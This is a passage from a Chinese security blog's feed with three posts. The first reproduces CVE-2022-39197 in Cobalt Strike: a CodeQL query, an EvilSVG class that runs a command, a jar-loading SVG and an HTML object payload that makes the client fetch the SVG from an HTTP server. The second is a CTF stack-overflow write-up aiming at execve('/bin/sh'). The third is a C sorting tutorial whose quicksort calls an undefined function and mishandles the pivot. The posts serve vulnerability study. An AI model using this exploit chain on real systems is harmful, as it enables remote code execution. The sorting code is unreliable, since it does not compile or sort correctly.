    <content type="html"><![CDATA[<h1 id="Cobalt-Strike-lt-x3D-4-7-1-RCE-简单分析与复现"><a href="#Cobalt-Strike-lt-x3D-4-7-1-RCE-简单分析与复现" class="headerlink" title="Cobalt Strike &lt;&#x3D;4.7.1 RCE 简单分析与复现"></a>Cobalt Strike &lt;&#x3D;4.7.1 RCE 简单分析与复现</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CVE-2022-39197这个洞是前段时间爆出来的，具体的复现过程也是拜读了漂亮鼠师傅的文章:</p><p><a href="https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ">https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ</a></p><p>漏洞具体的细节不再赘述，思路和上面提到的文章一样，核心就是以下几点：</p><ul><li>由于Swing库依赖加上CS本身的UI对html的渲染，导致我们引入html标签造成XSS。</li><li>CS里规定了不同的html标签有不同的解析方式，其中&lt;object&gt;标签允许我们传入指定类完成特定操作，要求是<ol><li>传入的类必须继承Component</li><li>类必须有无参构造方法</li><li>类必须存在一个拥有setXXX方法的属性</li><li>setXXX方法只能传入一个String作为参数</li></ol></li><li>关于触发点，我们需要找到CS中通过AES传输的数据模块，比如note、processlist、computer等</li></ul><h2 id="0x01-使用codeql寻找符合条件的类"><a href="#0x01-使用codeql寻找符合条件的类" class="headerlink" title="0x01 使用codeql寻找符合条件的类"></a>0x01 使用codeql寻找符合条件的类</h2><p>类的约束我们已经有了，下面就是怎么找的问题，首先直接在idea里搜索肯定是不行的，仅仅是继承自Component的子类在jdk中就有上百个：</p><p><img src="/CVE-2022-39197-CS-4-7-1RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221022235902337.png" alt="image-20221022235902337"></p><p>一个个筛肯定是不行的(如果有耐心的话好像也不是不行- -)，更好的办法肯定就是用静态分析工具了，使用codeql、tabby编写对应规则然后进行静态分析即可，好像还有师傅用Gadget Inspector直接搞出了攻击链，这点我不是很清楚，我使用的是codeql。</p><p>由于之前有编译好的jdk8的数据库，为图省事我就直接拿来用了，使用我粗糙的手法简单写一下ql语句，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassOrInterface</span>&#123;<br>    MyComponent()&#123;<br>        <span class="hljs-built_in">this</span>.getName()=<span class="hljs-string">&quot;Component&quot;</span> or <br>        <span class="hljs-built_in">this</span>.getAnAncestor().getName()=<span class="hljs-string">&quot;Component&quot;</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UsableClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RefType</span> &#123;<br>    UsableClass()&#123;<br>        <span class="hljs-built_in">this</span>.getAConstructor().hasNoParameters() and <br>        <span class="hljs-built_in">this</span>.getAConstructor().isPublic()<br>    &#125;<br>&#125;<br><br>predicate <span class="hljs-title function_">isMyClass</span><span class="hljs-params">( Class m)</span>&#123;<br>    m.getASourceSupertype() <span class="hljs-keyword">instanceof</span> MyComponent and<br>    m <span class="hljs-keyword">instanceof</span> UsableClass <br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UsableMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Method</span> &#123;<br>    UsableMethod() &#123;<br>        <span class="hljs-built_in">this</span>.getNumberOfParameters() = <span class="hljs-number">1</span><br>        and <span class="hljs-built_in">this</span>.getAParamType().hasName(<span class="hljs-string">&quot;String&quot;</span>)<br>        and <span class="hljs-built_in">this</span>.isPublic()<br>        and <span class="hljs-built_in">this</span>.getName().matches(<span class="hljs-string">&quot;set%&quot;</span>)<br>        &#125;<br>    &#125;<br><br>from UsableMethod me ,UsableClass cla<br>where <br>    <span class="hljs-title function_">isMyClass</span><span class="hljs-params">(cla)</span> and me.getDeclaringType() = cla<br>select cla<br><br></code></pre></td></tr></table></figure><p>结果是30多个类：</p><p><img src="/CVE-2022-39197-CS-4-7-1RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221023001615811.png" alt="image-20221023001615811"></p><p>然后我开始逐一寻找有无可以通过setXXX构造出攻击链的类，但是寻找了一番后没有结果，而且这些类都是来自jdk自带的Swing标准库，作为一个老牌UI库应该很难能有漏洞利用点。</p><p>就在陷入迷茫的时候，我突然想到，CS里是不是自带的lib里引入了swing库，结果一看确实存在，就在org.apache.batik包内。于是下面我用同样的方法，编译CS的源码载入codeql的database，结果也是30多个类，大多数类也都没有利用点，但有一个类 JSVGCanvas 引起了我的注意。</p><h2 id="0x02-org-apache-batik-JSVGCanvas"><a href="#0x02-org-apache-batik-JSVGCanvas" class="headerlink" title="0x02 org.apache.batik.JSVGCanvas"></a>0x02 org.apache.batik.JSVGCanvas</h2><p>JSVGCanvas类里有一个setURI方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setURI</span><span class="hljs-params">(String var1)</span> &#123;<br>   <span class="hljs-type">String</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.uri;<br>   <span class="hljs-built_in">this</span>.uri = var1;<br>   <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.uri != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-built_in">this</span>.loadSVGDocument(<span class="hljs-built_in">this</span>.uri);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">this</span>.setSVGDocument((SVGDocument)<span class="hljs-literal">null</span>);<br>   &#125;<br><br>   <span class="hljs-built_in">this</span>.pcs.firePropertyChange(<span class="hljs-string">&quot;URI&quot;</span>, var2, <span class="hljs-built_in">this</span>.uri);<br>&#125;<br></code></pre></td></tr></table></figure><p>代码很直白，直接允许我们引入外部svg，其实到这里我是比较怀疑的，在我的印象中svg不是图片格式么，通过引用图片能直接触发RCE吗？</p><p>然后我就在这里卡了很久，网上关于svg安全问题的资料几乎没有，最后看到了国外的一篇<a href="https://securityintelligence.com/posts/analysis-rce-vulnerability-cobalt-strike/">文章</a>，是查了<a href="https://xmlgraphics.apache.org/batik/using/scripting/java.html">batik的文档</a>才发现的。</p><p>文档中有一段代码提到：</p><blockquote><p>The follow code template demonstrates how to manipulate an SVG document displayed in a <a href="https://xmlgraphics.apache.org/batik/javadoc/org/apache/batik/swing/JSVGCanvas.html">JSVGCanvas</a> directly from a Java program. You don’t have to worry about graphics updates; after each event listener invocation the canvas is updated if needed.</p></blockquote><p>告诉我们如何通过去加载SVGDocument，代码样例有很多UI库里的Action实现，这给了我们一个启发，我们可以直接注册一个listner去监听初始化进程，当svg加载的时候就可以直接触发恶意代码。</p><p>在文档的末尾提到如何利用svg去执行java代码：</p><p><img src="/CVE-2022-39197-CS-4-7-1RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221023005415495.png" alt="image-20221023005415495"></p><p>可以看到svg是支持插入html标签的，根据文档指示我们可以归纳出以下几点要求：</p><ul><li>需要在指定SVG中插入html，并指定<strong>xlink:href</strong>属性为java归档文件</li><li>类必须继承自<strong>EventListenerInitializer</strong>，需要添加listener以触发执行指定代码</li><li>需要在jar清单中指定<strong>SVG-Handler-Class</strong>属性为类路径</li></ul><p>顺着这些要求我们下一步开始构造。</p><h2 id="0x03-触发漏洞"><a href="#0x03-触发漏洞" class="headerlink" title="0x03 触发漏洞"></a>0x03 触发漏洞</h2><p>batik可以直接通过maven引入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>xml-apis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xml-apis-ext<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.04<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>首先是编写好要执行的java代码，重写匿名内部类的handleEvent方法，嵌入恶意代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//EvilSVG.java</span><br><span class="hljs-keyword">package</span> org.spring.test;<br><span class="hljs-keyword">import</span> org.w3c.dom.events.EventListener;<br><span class="hljs-keyword">import</span> org.w3c.dom.svg.EventListenerInitializer;<br><span class="hljs-keyword">import</span> org.w3c.dom.svg.SVGDocument;<br><span class="hljs-keyword">import</span> org.w3c.dom.svg.SVGSVGElement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilSVG</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">EventListenerInitializer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilSVG</span><span class="hljs-params">()</span>&#123;&#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initializeEventListeners</span><span class="hljs-params">(SVGDocument svgDocument)</span> &#123;<br>        <span class="hljs-type">SVGSVGElement</span> <span class="hljs-variable">rootElement</span> <span class="hljs-operator">=</span> svgDocument.getRootElement();<br>        <span class="hljs-type">EventListener</span> <span class="hljs-variable">eventListener</span> <span class="hljs-operator">=</span> event -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            &#125;<br>        &#125;;<br>        rootElement.addEventListener(<span class="hljs-string">&quot;spring&quot;</span>, eventListener,<span class="hljs-literal">false</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后准备好svg和清单：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">//1.svg<br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span> = <span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xlink</span> = <span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">&quot;0 0 0 0 &quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">&quot;5.jar&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/java-archive&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">//Manifest</span><br>Manifest-<span class="hljs-keyword">Version</span>: 1.0<br>SVG-Handler-<span class="hljs-keyword">Class</span>: org.spring.<span class="hljs-keyword">test</span>.EvilSVG<br></code></pre></td></tr></table></figure><p>其实这里也可以直接使用maven去添加SVG-Handler-Class：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">spring.svg</span>&gt;</span>org.spring.test.EvilSVG<span class="hljs-tag">&lt;/<span class="hljs-name">spring.svg</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">....</span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">         <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">         <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">         <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span></span><br><span class="language-xml">             <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span></span><br><span class="language-xml">                 <span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span></span><br><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">addDefaultImplementationEntries</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addDefaultImplementationEntries</span>&gt;</span></span><br><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">addDefaultSpecificationEntries</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addDefaultSpecificationEntries</span>&gt;</span></span><br><span class="language-xml">                 <span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span></span><br><span class="language-xml">                 <span class="hljs-tag">&lt;<span class="hljs-name">manifestEntries</span>&gt;</span></span><br><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">SVG-Handler-Class</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;spring.svg&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">SVG-Handler-Class</span>&gt;</span></span><br><span class="language-xml">                 <span class="hljs-tag">&lt;/<span class="hljs-name">manifestEntries</span>&gt;</span></span><br><span class="language-xml">             <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span></span><br><span class="language-xml">         <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></span><br><span class="language-xml">     <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>首先编译代码。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">mvn</span> clean install -DskipTests<br></code></pre></td></tr></table></figure><p>将代码编译好之后，来到target&#x2F;classes目录下，将Manifest，编译好的包一起打包进1.jar，命令是：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jar </span>cmf Manifest <span class="hljs-number">5</span>.<span class="hljs-keyword">jar </span><span class="hljs-keyword">org</span><br></code></pre></td></tr></table></figure><p>这里Mainfest文件不知道为什么就是打包不进去，后来就直接通过pom来添加键值对了：</p><p><a href="https://blog.csdn.net/kanyun123/article/details/113057783">https://blog.csdn.net/kanyun123/article/details/113057783</a></p><p>或者直接手动修改：</p><p><img src="/CVE-2022-39197-CS-4-7-1RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221019153039339.png" alt="image-20221019153039339"></p><p>开一个http，然后CS beacon处打上note触发漏洞：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;org.apache.batik.swing.JSVGCanvas&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;URI&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;http://127.0.0.1:8000/1.svg&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/CVE-2022-39197-CS-4-7-1RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221019154525962.png" alt="image-20221019154525962"></p><p>演示：</p><p><video id="video" controls="" preload="none"> <source id="mp4" src="https://spr1n9t1me.github.io/2022/10/18/CVE-2022-39197-CS-4-7-1RCE-分析复现/CS_RCE.mp4" type="video/mp4"> </video></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>CS反制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn_practice</title>
    <link href="/2022/10/01/pwn-practice/"/>
    <url>/2022/10/01/pwn-practice/</url>
    
    <content type="html"><![CDATA[<p>栈基础知识：<a href="http://tttang.com/archive/1361/">http://tttang.com/archive/1361/</a></p><h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p><a href="https://sillyrabbit.cn/pwn/ciscn_2019_s_3/">https://sillyrabbit.cn/pwn/ciscn_2019_s_3/</a></p><p>检查保护，栈题没开pie和canary。首先main函数给了一个栈溢出：</p><img src="/2022/10/01/pwn-practice/image-20221001191315162.png" class="" title="image-20221001191315162"><p>使用的是sys_read和sys_write系统调用，允许输入0x400字节，然后输出0x30字节。</p><p>看到栈溢出想到常规思路，没有后门函数，没有libc里的函数put、write等的调用因此不能泄露地址ret2libc，但是注意到gadget函数的汇编代码:</p><img src="/2022/10/01/pwn-practice/image-20221001191946682.png" class="" title="image-20221001191946682"><p>两个mov控制了rax寄存器，值分别是15(sys_rt_sigreturn)和59(sys_execve)；后面看到wp的才知道，这里其实是给syscall调用做铺垫，这题我们需要利用syscall来解决，首先需要控制几个寄存器的值。</p><p>rax直接用给的gadget即可，rdi有，所以最主要的问题是rdx，这里是利用了csu的通用gadget来间接控制rdx</p><p>然后execv(rdi,rsi,rdx)，其中rdi&#x3D;”&#x2F;bin&#x2F;sh\x00”，rsi&#x3D;rdx&#x3D;0。使用如下通用gadget:</p><img src="/2022/10/01/pwn-practice/image-20221002125333875.png" class="" title="image-20221002125333875"><p>注意vuln函数结尾的指令：</p><img src="/2022/10/01/pwn-practice/image-20221002123604737.png" class="" title="image-20221002123604737"><p>局部函数直接ret没有leave，这意味着函数返回时不会清空栈的内容，那么这样我们就能够在栈上写入&#x2F;bin&#x2F;sh，然后通过write来泄露&#x2F;bin&#x2F;sh相对栈顶的偏移得到其地址，最终就可以使用&#x2F;bin&#x2F;sh。</p><h3 id="泄露-x2F-bin-x2F-sh"><a href="#泄露-x2F-bin-x2F-sh" class="headerlink" title="泄露&#x2F;bin&#x2F;sh"></a>泄露&#x2F;bin&#x2F;sh</h3><p>首先使用gdb调试，断点打在vuln函数的sys_read处。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gdb</span> ./pwn<br><span class="hljs-attribute">b</span> *<span class="hljs-number">0</span>x400501<br></code></pre></td></tr></table></figure><p>然后run</p><img src="/2022/10/01/pwn-practice/image-20221002133744199.png" class="" title="image-20221002133744199"><p>下一步输入aaaa，去观察一下字符串的位置。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">search aaaa</span><br></code></pre></td></tr></table></figure><img src="/2022/10/01/pwn-practice/image-20221002133852883.png" class="" title="image-20221002133852883"><p>查看其距离rsp的地址计算偏移，再通过write泄露栈基地址(write(20)之后的八字节就是栈的基地址)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>每日C</title>
    <link href="/2022/09/21/%E6%AF%8F%E6%97%A5C/"/>
    <url>/2022/09/21/%E6%AF%8F%E6%97%A5C/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h1><h2 id="day1-排序"><a href="#day1-排序" class="headerlink" title="day1 排序"></a>day1 排序</h2><p>大纲要求：冒泡排序、选择排序、快速排序</p><h3 id="1-快速排序"><a href="#1-快速排序" class="headerlink" title="1.快速排序"></a>1.快速排序</h3><p>快速排序算法通过多次比较和交换来实现排序，其排序流程如下：  </p><p>(1)首先设定一个分界值，通过该分界值将数组分成左右两部分。  </p><p>(2)将大于或等于分界值的数据集中到数组右边，小于分界值的数据集中到数组的左边。此时，左边部分中各元素都小于分界值，而右边部分中各元素都大于或等于分界值。  </p><p>(3)然后，左边和右边的数据可以独立排序。对于左侧的数组数据，又可以取一个分界值，将该部分数据分成左右两部分，同样在左边放置较小值，右边放置较大值。右侧的数组数据也可以做类似处理。  </p><p>(4)重复上述过程，可以看出，这是一个递归定义。通过递归将左侧部分排好序后，再递归排好右侧部分的顺序。当左、右两个部分各数据排序完成后，整个数组的排序也就完成了。</p><p><strong>要点：选取一个基准x(可以选取中间的元素或者第一个元素)，选取起点start与终点end，每次循环都把比基准大的值放在右边，比基准小的值放在左边，左边从下标i&#x3D;start递增，右边下标从j&#x3D;end递减；</strong></p><p><strong>循环一次之后a[i]左边都比x小，右边都比x大；把基准和a[i]替换，然后再递归即可完成排序。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">quickSort</span><span class="hljs-params">(<span class="hljs-type">int</span> a[],<span class="hljs-type">int</span> start,<span class="hljs-type">int</span> end)</span>    <span class="hljs-comment">//start和end都是指下标</span><br>&#123;<br>    <span class="hljs-type">int</span> i,j,temp,x;<br>    i=start;<br>    j=end;<br>    x=a[start];    <span class="hljs-comment">//选取基准值</span><br>    <span class="hljs-keyword">while</span>(i&lt;j)<br>    &#123;<br>        <span class="hljs-keyword">while</span>(i&lt;j &amp;&amp; x&lt;a[j])    <span class="hljs-comment">//从右向左搜索小于基准值的数,让j等于它的下标</span><br>            j--;<br>        <span class="hljs-keyword">while</span>(i&lt;j &amp;&amp; x&gt;a[i])    <span class="hljs-comment">//从左向右搜索大于基准值的数,让i等于它的下标</span><br>            i++;<br>        <span class="hljs-keyword">if</span>(i&lt;j)    <span class="hljs-comment">//在满足i&lt;j的条件下，交换a[i]和a[j]的值 </span><br>        &#123;<br>            temp=a[j];<br>            a[j]=a[i];<br>            a[i]=temp;<br>        &#125;<br>    &#125;<br>    temp=x;   <span class="hljs-comment">//跳出循环之后，把基准值和a[i]调换 </span><br>    x=a[i];<br>    a[i]=temp;<br>    <span class="hljs-keyword">if</span>(start&lt;j)    <span class="hljs-comment">//递归 </span><br>        kuaipai(a,start,j<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span>(i&lt;end)<br>        kuaipai(a,j+<span class="hljs-number">1</span>,end);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">int</span> s[],<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,s[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>&#125;;<br>print(a,<span class="hljs-number">8</span>);    <span class="hljs-comment">//先在屏幕上输出原来的数字序列 </span><br>kuaipai(a,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>);    <span class="hljs-comment">//调用快排函数，将a排序 </span><br>print(a,<span class="hljs-number">8</span>);    <span class="hljs-comment">//输出排好序的数字序列 </span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-冒泡排序"><a href="#2-冒泡排序" class="headerlink" title="2.冒泡排序"></a>2.冒泡排序</h3><p>要点：每次遍历把最大的数放到最后，循环n次后就完成从小到到大的排序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">bubbleSort</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-type">int</span> L)</span>&#123;<br><span class="hljs-type">int</span> t;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">int</span> j;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;L<span class="hljs-number">-1</span>;i++)&#123;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;L-i<span class="hljs-number">-1</span>;j++)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">array</span>[j]&gt;<span class="hljs-built_in">array</span>[j+<span class="hljs-number">1</span>])&#123;<br>t=<span class="hljs-built_in">array</span>[j];<br><span class="hljs-built_in">array</span>[j]=<span class="hljs-built_in">array</span>[j+<span class="hljs-number">1</span>];<br><span class="hljs-built_in">array</span>[j+<span class="hljs-number">1</span>]=t;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-选择排序"><a href="#3-选择排序" class="headerlink" 